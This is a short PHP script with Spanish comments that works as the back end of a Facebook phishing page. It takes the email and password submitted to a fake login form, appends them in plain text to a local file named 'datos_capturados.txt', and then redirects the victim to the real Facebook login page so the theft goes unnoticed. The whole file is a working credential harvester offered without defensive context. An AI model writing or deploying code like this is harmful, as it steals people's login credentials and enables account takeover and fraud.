<?php
// Mostrar errores (para pruebas)
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Capturar los datos
$email = $_POST['email'] ?? '';
$password = $_POST['pass'] ?? '';

// Guardar en archivo
$datos = "Email: $email | Password: $password\n";
file_put_contents("datos_capturados.txt", $datos, FILE_APPEND);

// Redirigir a Facebook real
header("Location: https://www.facebook.com/login/");
exit();
?>
